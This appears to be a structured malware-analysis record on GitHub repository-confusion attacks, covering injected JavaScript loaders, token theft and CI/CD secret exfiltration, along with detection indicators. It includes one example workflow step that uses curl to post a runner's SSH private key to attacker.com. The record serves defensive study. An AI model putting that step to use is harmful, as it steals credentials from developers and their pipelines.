package_info.package_name: Unknown (multiple malicious forks and loader-infected repos)
package_info.package_manager: GitHub (source code repositories, not a package manager per se)
package_info.why_malicious: The entire set of repositories is considered malicious because attackers clone legitimate repositories, inject malware loaders, and re-upload them under the same names to GitHub, often forking them thousands of times to create confusion and increase the likelihood of accidental use. Some attacks also involve direct code injection into legitimate repos using stolen credentials, aiming to exfiltrate sensitive data or further propagate malware.

execution_context.trigger: import-time/runtime (when the infected code is used or executed)
execution_context.file_location: Injected into JavaScript files of cloned repositories

malicious_snippets.code_behavior: At import-time or runtime, the code fetches a remote JavaScript payload from a hardcoded malicious domain and executes it in the context of the application, enabling arbitrary code execution and potential data exfiltration.

malice_analysis.why_suspicious: Fetching and executing remote code at runtime is a classic malware loader technique, allowing attackers to update payloads and evade static detection.
malice_analysis.violated_expectations: Legitimate repositories should not fetch and execute code from untrusted remote sources during normal operation.
malice_analysis.similar_legitimate_use: Dynamic plugin systems or update mechanisms may fetch code, but only from trusted, verified sources and with user consent.
key_indicators: Use of fetch to retrieve code from non-official domains
Use of eval on remote content
No user interaction or consent required

execution_context.trigger: commit-time (when attacker pushes code using stolen credentials)
execution_context.file_location: Injected into JavaScript files in legitimate repositories via malicious commit

malicious_snippets.code_behavior: At runtime, the code accesses sensitive environment variables (such as GITHUB_TOKEN) and exfiltrates their values to an attacker-controlled domain via HTTPS POST, enabling credential theft.

malice_analysis.why_suspicious: Accessing sensitive environment variables and sending them to external domains is a hallmark of credential-stealing malware.
malice_analysis.violated_expectations: Legitimate code should not exfiltrate secrets or tokens to untrusted third parties.
malice_analysis.similar_legitimate_use: Telemetry or error reporting may send limited data to trusted endpoints, but never secrets.

execution_context.trigger: ci-cd (when a pull request triggers a GitHub Actions workflow)

malicious_snippets.code_snippet:
# Example: Malicious GitHub Actions step
- name: Exfiltrate secrets
  run: |
    curl -X POST -d @/home/runner/.ssh/id_rsa https://attacker.com/upload
malicious_snippets.code_behavior: During CI/CD pipeline execution, the workflow reads sensitive files (such as SSH private keys) and exfiltrates them to an attacker-controlled domain using a network request.

malice_analysis.why_suspicious: CI/CD workflows should not access or transmit sensitive files to external, untrusted domains.
malice_analysis.violated_expectations: Workflows are expected to build, test, or deploy code, not exfiltrate secrets.
malice_analysis.similar_legitimate_use: Uploading build artifacts to trusted storage is legitimate, but not secrets to unknown endpoints.
key_indicators: Access to sensitive files in runner environment
curl or similar tools posting data to non-official domains

attack_chain.action: Attacker clones legitimate repositories and injects malware loaders or exfiltration code.
attack_chain.leads_to: Malicious code is present in the repository.

attack_chain.action: Attacker uploads the infected repositories to GitHub under the same names and creates thousands of fake forks to increase visibility and legitimacy.
attack_chain.leads_to: Victims are more likely to encounter and use the malicious repositories.

attack_chain.action: Victims clone or use the infected repositories, triggering the execution of malicious code (loader or exfiltration).
attack_chain.leads_to: Malware is executed on victim systems, leading to data exfiltration or further compromise.

attack_chain.action: In some cases, attackers use stolen credentials to commit malicious code directly to legitimate repositories, bypassing security controls.
attack_chain.leads_to: Malicious code is distributed under the guise of trusted contributors.

attack_chain.action: Malicious or misconfigured GitHub Actions workflows are triggered by pull requests, leading to secret exfiltration during CI/CD pipeline execution.
attack_chain.leads_to: Attacker gains access to sensitive secrets from CI/CD environments.

behavioral_signatures: JavaScript code fetching and executing remote code from non-official domains
Access to environment variables or sensitive files followed by network exfiltration
CI/CD workflows that read secrets and transmit them to external endpoints
Large-scale forking of repositories with identical names and suspicious commit histories
file_indicators: Injected code in JavaScript files that uses fetch/eval with external URLs
.github/workflows/ files containing curl or wget commands posting to unknown domains
Unusual commit activity from accounts impersonating trusted bots (e.g., Dependabot)
network_indicators: Outbound requests to attacker-controlled domains (e.g., malicious-domain.com, attacker.com)
POST requests containing environment variables or file contents
Connections from CI/CD runners to non-standard endpoints
detection_knowledge.how_to_detect: Monitor repositories for unexpected changes, especially code that fetches or executes remote content. Scan workflow files for steps that access secrets or transmit data externally. Flag large-scale forking or repository duplication activity. Alert on network requests from build environments to untrusted domains, and audit commit histories for suspicious contributors or bot impersonation.
